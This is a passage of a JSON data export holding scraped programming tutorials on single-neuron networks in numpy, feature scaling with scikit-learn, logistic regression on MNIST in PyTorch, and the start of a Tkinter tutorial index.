network.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0output = self.learn(inputs)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Calculate the error\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0error = outputs - output\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Adjust the weights by a factor\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0factor = dot(inputs.T, error * self.__sigmoid_derivative(output))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.synaptic_weights += factor\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# The neural network thinks.\u00a0\u00a0\u00a0\u00a0\u00a0def learn(self, inputs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.__sigmoid(dot(inputs, self.synaptic_weights))\u00a0\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0# Initialize\u00a0\u00a0\u00a0\u00a0neural_network = NeuralNet()\u00a0\u00a0\u00a0\u00a0\u00a0# The training set.\u00a0\u00a0\u00a0\u00a0inputs = array([[0, 1, 1], [1, 0, 0], [1, 0, 1]])\u00a0\u00a0\u00a0\u00a0outputs = array([[1, 0, 1]]).T\u00a0\u00a0\u00a0\u00a0\u00a0# Train the neural network\u00a0\u00a0\u00a0\u00a0neural_network.train(inputs, outputs, 10000)\u00a0\u00a0\u00a0\u00a0\u00a0# Test the neural network with a test example.\u00a0\u00a0\u00a0\u00a0print(neural_network.learn(array([1, 0, 1])))Expected Output: After 10 iterations our neural network predicts the value to be 0.65980921. \u00a0It looks not good as the answer should really be 1. If we increase the number of iterations to 100, we get 0.87680541. Our network is getting smarter! Subsequently, for 10000 iterations we get 0.9897704 which is pretty close and indeed a satisfactory output.References:\u00a0\u00a0NEURAL NETWORKS by Christos Stergiou and Dimitrios SiganosFundamentals of Deep Learning \u2013 Starting with Artificial Neural NetworkTinker With a Neural Network Right Here in Your BrowserNeural Networks DemystifiedThis article is contributed by Vivek Pal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "edbd4fb280d3102e58f2f0f3b90d2454",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Neural networks are the core of deep learning, a field that has practical applications in many different areas. Today neural networks are used for image classification, speech recognition, object detection, etc. Now, Let\u2019s try to understand the basic unit behind all these states of art techniques.A single neuron transforms given input into some output. Depending on the given input and weights assigned to each input, decide whether the neuron fired or not. Let\u2019s assume the neuron has 3 input connections and one output.\u00a0We will be using tanh activation function in a given example.The end goal is to find the optimal set of weights for this neuron that produces correct results. Do this by training the neuron with several different training examples. At each step calculate the error in the output of the neuron, and backpropagate the gradients. The step of calculating the output of a neuron is called forward propagation while the calculation of gradients is called back propagation.Below is the implementation :\u00a0\u00a0Python3# Python program to implement a# single neuron neural network\u00a0# import all necessary librariesfrom numpy import exp, array, random, dot, tanh\u00a0# Class to create a neural# network with single neuronclass NeuralNetwork():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Using seed to make sure it'll\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# generate same weights in every run\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random.seed(1)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# 3x1 Weight matrix\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.weight_matrix = 2 * random.random((3, 1)) - 1\u00a0\u00a0\u00a0\u00a0\u00a0# tanh as activation function\u00a0\u00a0\u00a0\u00a0def tanh(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return tanh(x)\u00a0\u00a0\u00a0\u00a0\u00a0# derivative of tanh function.\u00a0\u00a0\u00a0\u00a0# Needed to calculate the gradients.\u00a0\u00a0\u00a0\u00a0def tanh_derivative(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 1.0 - tanh(x) ** 2\u00a0\u00a0\u00a0\u00a0\u00a0# forward propagation\u00a0\u00a0\u00a0\u00a0def forward_propagation(self, inputs):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.tanh(dot(inputs, self.weight_matrix))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# training the neural network.\u00a0\u00a0\u00a0\u00a0def train(self, train_inputs, train_outputs,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0num_train_iterations):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Number of iterations we want to\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# perform for this set of input.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for iteration in range(num_train_iterations):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0output = self.forward_propagation(train_inputs)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Calculate the error in the output.\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0error = train_outputs - output\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# multiply the error by input and then\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# by gradient of tanh function to calculate\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# the adjustment needs to be made in weights\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0adjustment = dot(train_inputs.T, error *\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.tanh_derivative(output))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Adjust the weight matrix\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.weight_matrix += adjustment\u00a0# Driver Codeif __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0neural_network = NeuralNetwork()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print ('Random weights at the start of training')\u00a0\u00a0\u00a0\u00a0print (neural_network.weight_matrix)\u00a0\u00a0\u00a0\u00a0\u00a0train_inputs = array([[0, 0, 1], [1, 1, 1], [1, 0, 1], [0, 1, 1]])\u00a0\u00a0\u00a0\u00a0train_outputs = array([[0, 1, 1, 0]]).T\u00a0\u00a0\u00a0\u00a0\u00a0neural_network.train(train_inputs, train_outputs, 10000)\u00a0\u00a0\u00a0\u00a0\u00a0print ('New weights after training')\u00a0\u00a0\u00a0\u00a0print (neural_network.weight_matrix)\u00a0\u00a0\u00a0\u00a0\u00a0# Test the neural network with a new situation.\u00a0\u00a0\u00a0\u00a0print (\"Testing network on new examples ->\")\u00a0\u00a0\u00a0\u00a0print (neural_network.forward_propagation(array([1, 0, 0])))Output :\u00a0\u00a0Random weights at the start of training\n[[-0.16595599]\n [ 0.44064899]\n [-0.99977125]]\n\nNew weights after training\n[[5.39428067]\n [0.19482422]\n [0.34317086]]\n\nTesting network on new examples ->\n[0.99995873]\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b1f7249f8417552850da5a60b0ef078d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Feature Scaling or Standardization: It is a step of Data Pre Processing that is applied to independent variables or features of data. It basically helps to normalize the data within a particular range. Sometimes, it also helps in speeding up the calculations in an algorithm.Package Used:\u00a0sklearn.preprocessingImport:\u00a0\u00a0 from sklearn.preprocessing import StandardScalerThe formula used in Backend\u00a0Standardization replaces the values with their Z scores.\u00a0Mostly the Fit method is used for Feature scaling\u00a0fit(X, y = None)\nComputes the mean and std to be used for later scaling.Pythonimport pandas as pdfrom sklearn.preprocessing import StandardScaler\u00a0# Read Data from CSVdata = read_csv('Geeksforgeeks.csv')data.head()\u00a0# Initialise the Scalerscaler = StandardScaler()\u00a0# To scale datascaler.fit(data)Why and Where to Apply Feature Scaling?\u00a0The real-world dataset contains features that highly vary in magnitudes, units, and range. Normalization should be performed when the scale of a feature is irrelevant or misleading and not should Normalise when the scale is meaningful.The algorithms which use Euclidean Distance measures are sensitive to Magnitudes. Here feature scaling helps to weigh all the features equally.Formally, If a feature in the dataset is big in scale compared to others then in algorithms where Euclidean distance is measured this big scaled feature becomes dominating and needs to be normalized.\u00a0Examples of Algorithms where Feature Scaling matters\u00a01. K-Means uses the Euclidean distance measure here feature scaling matters.\u00a02. K-Nearest-Neighbours also require feature scaling.\u00a03. Principal Component Analysis (PCA): Tries to get the feature with maximum variance, here too feature scaling is required.\u00a04. Gradient Descent: Calculation speed increase as Theta calculation becomes faster after feature scaling.Note: Naive Bayes, Linear Discriminant Analysis, and Tree-Based models are not affected by feature scaling.\u00a0In Short, any Algorithm which is Not Distance-based is Not affected by Feature Scaling.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "cf68145904e261630bf4d02603a1ba38",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Logistic Regression is a very commonly used statistical method that allows us to predict a binary output from a set of independent variables. The various properties of logistic regression and its Python implementation have been covered in this article previously. Now, we shall find out how to implement this in PyTorch, a very popular deep learning library that is being developed by Facebook.Now, we shall see how to classify handwritten digits from the MNIST dataset using Logistic Regression in PyTorch. Firstly, you will need to install PyTorch into your Python environment. The easiest way to do this is to use the pip or conda tool. Visit pytorch.org and install the version of your Python interpreter and the package manager that you would like to use.With PyTorch installed, let us now have a look at the code. Write the three lines given below to import the required library functions and objects.Python3import torchimport torch.nn as nnimport torchvision.datasets as dsetsimport torchvision.transforms as transformsfrom torch.autograd import VariableHere, the torch.nn module contains the code required for the model, torchvision.datasets contain the MNIST dataset. It contains the dataset of handwritten digits that we shall be using here. The torchvision.transforms module contains various methods to transform objects into others. Here, we shall be using it to transform from images to PyTorch tensors. Also, the torch.autograd module contains the Variable class amongst others, which will be used by us while defining our tensors.Next, we shall download and load the dataset to memory.Python3# MNIST Dataset (Images and Labels)train_dataset = dsets.MNIST(root ='./data',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0train = True,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0transform = transforms.ToTensor(),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0download = True)\u00a0\u00a0test_dataset = dsets.MNIST(root ='./data',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0train = False,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0transform = transforms.ToTensor())\u00a0\u00a0# Dataset Loader (Input Pipeline)train_loader = torch.utils.data.DataLoader(dataset = train_dataset,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0batch_size = batch_size,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0shuffle = True)\u00a0\u00a0test_loader = torch.utils.data.DataLoader(dataset = test_dataset,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0batch_size = batch_size,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0shuffle = False)Now, we shall define our hyperparameters.Python3# Hyper Parameters\u00a0input_size = 784num_classes = 10num_epochs = 5batch_size = 100learning_rate = 0.001In our dataset, the image size is 28*28. Thus, our input size is 784. Also, 10 digits are present in this and hence, we can have 10 different outputs. Thus, we set num_classes as 10. Also, we shall train five times on the entire dataset. Finally, we will train in small batches of 100 images each so as to prevent the crashing of the program due to memory overflow.After this, we shall be defining our model as below. Here, we shall initialize our model as a subclass of torch.nn.Module and then define the forward pass. In the code that we are writing, the softmax is internally calculated during each forward pass and hence we do not need to specify it inside the forward() function.Python3class LogisticRegression(nn.Module):\u00a0\u00a0\u00a0\u00a0def __init__(self, input_size, num_classes):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0super(LogisticRegression, self).__init__()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.linear = nn.Linear(input_size, num_classes)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def forward(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0out = self.linear(x)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return outHaving defined our class, now we instantiate an object for the same.Python3model = LogisticRegression(input_size, num_classes)Next, we set our loss function and the optimizer. Here, we shall be using the cross-entropy loss and for the optimizer, we shall be using the stochastic gradient descent algorithm with a learning rate of 0.001 as defined in the hyperparameter above.Python3criterion = nn.CrossEntropyLoss()optimizer = torch.optim.SGD(model.parameters(), lr = learning_rate)Now, we shall start the training. Here, we shall be performing the following tasks:Reset all gradients to 0.Make a forward pass.Calculate the loss.Perform backpropagation.Update all weights.Python3# Training the Modelfor epoch in range(num_epochs):\u00a0\u00a0\u00a0\u00a0for i, (images, labels) in enumerate(train_loader):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0images = Variable(images.view(-1, 28 * 28))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0labels = Variable(labels)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Forward + Backward + Optimize\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0optimizer.zero_grad()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0outputs = model(images)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0loss = criterion(outputs, labels)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0loss.backward()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0optimizer.step()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (i + 1) % 100 == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Epoch: [% d/% d], Step: [% d/% d], Loss: %.4f'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0% (epoch + 1, num_epochs, i + 1,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0len(train_dataset) // batch_size, loss.data[0]))Finally, we shall be testing out the model by using the following code.Python3# Test the Modelcorrect = 0total = 0for images, labels in test_loader:\u00a0\u00a0\u00a0\u00a0images = Variable(images.view(-1, 28 * 28))\u00a0\u00a0\u00a0\u00a0outputs = model(images)\u00a0\u00a0\u00a0\u00a0_, predicted = torch.max(outputs.data, 1)\u00a0\u00a0\u00a0\u00a0total += labels.size(0)\u00a0\u00a0\u00a0\u00a0correct += (predicted == labels).sum()\u00a0\u00a0print('Accuracy of the model on the 10000 test images: % d %%' % (\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0100 * correct / total))Assuming that you performed all steps correctly, you will get an accuracy of 82%, which is far off from today\u2019s state-of-the-art model, which uses a special type of neural network architecture. For your reference, you can find the entire code for this article below:Python3import torchimport torch.nn as nnimport torchvision.datasets as dsetsimport torchvision.transforms as transformsfrom torch.autograd import Variable\u00a0\u00a0\u00a0\u00a0# MNIST Dataset (Images and Labels)train_dataset = dsets.MNIST(root ='./data',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0train = True,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0transform = transforms.ToTensor(),\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0download = True)\u00a0\u00a0test_dataset = dsets.MNIST(root ='./data',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0train = False,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0transform = transforms.ToTensor())\u00a0\u00a0# Dataset Loader (Input Pipeline)train_loader = torch.utils.data.DataLoader(dataset = train_dataset,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0batch_size = batch_size,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0shuffle = True)\u00a0\u00a0test_loader = torch.utils.data.DataLoader(dataset = test_dataset,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0batch_size = batch_size,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0shuffle = False)\u00a0\u00a0# Hyper Parametersinput_size = 784num_classes = 10num_epochs = 5batch_size = 100learning_rate = 0.001\u00a0\u00a0# Modelclass LogisticRegression(nn.Module):\u00a0\u00a0\u00a0\u00a0def __init__(self, input_size, num_classes):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0super(LogisticRegression, self).__init__()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.linear = nn.Linear(input_size, num_classes)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def forward(self, x):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0out = self.linear(x)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return out\u00a0\u00a0\u00a0\u00a0model = LogisticRegression(input_size, num_classes)\u00a0\u00a0# Loss and Optimizer# Softmax is internally computed.# Set parameters to be updated.criterion = nn.CrossEntropyLoss()optimizer = torch.optim.SGD(model.parameters(), lr = learning_rate)\u00a0\u00a0# Training the Modelfor epoch in range(num_epochs):\u00a0\u00a0\u00a0\u00a0for i, (images, labels) in enumerate(train_loader):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0images = Variable(images.view(-1, 28 * 28))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0labels = Variable(labels)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Forward + Backward + Optimize\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0optimizer.zero_grad()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0outputs = model(images)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0loss = criterion(outputs, labels)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0loss.backward()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0optimizer.step()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (i + 1) % 100 == 0:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print('Epoch: [% d/% d], Step: [% d/% d], Loss: %.4f'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0% (epoch + 1, num_epochs, i + 1,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0len(train_dataset) // batch_size, loss.data[0]))\u00a0\u00a0# Test the Modelcorrect = 0total = 0for images, labels in test_loader:\u00a0\u00a0\u00a0\u00a0images = Variable(images.view(-1, 28 * 28))\u00a0\u00a0\u00a0\u00a0outputs = model(images)\u00a0\u00a0\u00a0\u00a0_, predicted = torch.max(outputs.data, 1)\u00a0\u00a0\u00a0\u00a0total += labels.size(0)\u00a0\u00a0\u00a0\u00a0correct += (predicted == labels).sum()\u00a0\u00a0print('Accuracy of the model on the 10000 test images: % d %%' % (\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0100 * correct / total))References:PyTorchZeroToAllyunjey on Github\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "837ce2e3fbbd5577fcb11051cb371ba5",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Tkinter is the most commonly used library for developing GUI (Graphical User Interface) in Python. It is a standard Python interface to the Tk GUI toolkit shipped with Python. As Tk and Tkinter are available on most of the Unix platforms as well as on the Windows system, developing GUI applications with Tkinter becomes the fastest and easiest.This Tkinter Tutorial will help learning Tkinter from Basics to advance GUI development, including all the necessary functions explained in detail.Table of ContentsIntroductionWidgetsBasic WidgetsToplevel WidgetsGeometry ManagementBinding FunctionsWorking with Images in TkinterTkinter AdvanceApplications and ProjectsRecent Articles on Python TKinter !IntroductionIntroduction to TkinterWhat are Widgets in Tkinter?Hello World in TkinterCreate First GUI Application using Python-TkinterPython GUI \u2013 tkinter OverviewWidgetsBasic WidgetsCreating a button in tkinterAdd style to tkinter buttonAdd image on a Tkinter buttonLabel Widget in TkinterCreate LabelFrame and add widgets to itRadioButton in TkinterCheckbutton in TkinterCanvas WidgetCreate different shapes using Canvas classCreate different type of lines using Canvas classMoving objects using Canvas.move() methodCombobox Widget in tkinterSet the Maximum size of the RootSet the Minimum size of the RootResizing Root in TkinterEntry WidgetRead only Entry WidgetText WidgetMessage WidgetMenu widget in TkinterMenubutton WidgetSpinBox WidgetProgressbar widget in TkinterScrollbar Widget in TkinterScrolledText WidgetListBox WidgetScrollable ListBox in Python-tkinterFrame WidgetScrollable Frames in TkinterHow to make a proper double scrollbar frame in TkinterScale WidgetHierarchical treeview WidgetTreeview 